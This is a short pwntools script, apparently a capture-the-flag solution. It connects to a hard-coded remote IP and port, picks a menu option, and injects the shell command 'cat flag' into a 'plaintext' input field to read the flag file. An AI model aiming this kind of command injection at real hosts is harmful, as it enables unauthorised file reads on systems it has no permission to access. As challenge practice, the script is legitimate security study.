import sys
import logging
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

HOST = "110.10.147.44"
PORT = 7777
logging.info("***remote exploit ***")
logging.info("[*]target host : " + HOST)
logging.info("[*]target port : " + str(PORT))
target = remote(HOST, PORT)
logging.info("[*] target connect")

def main():
    start_disp = target.recvuntil("> ")
    logging.info(start_disp)

    target.sendline("1")
    logging.info("[*] select 1")
    
    _ = target.recvuntil("plaintext = ")
    target.sendline("cat flag")
    logging.info("send cat flag")
    ret = target.recvline()

    logging.info(ret)
    
if __name__ == "__main__":
    main()


            
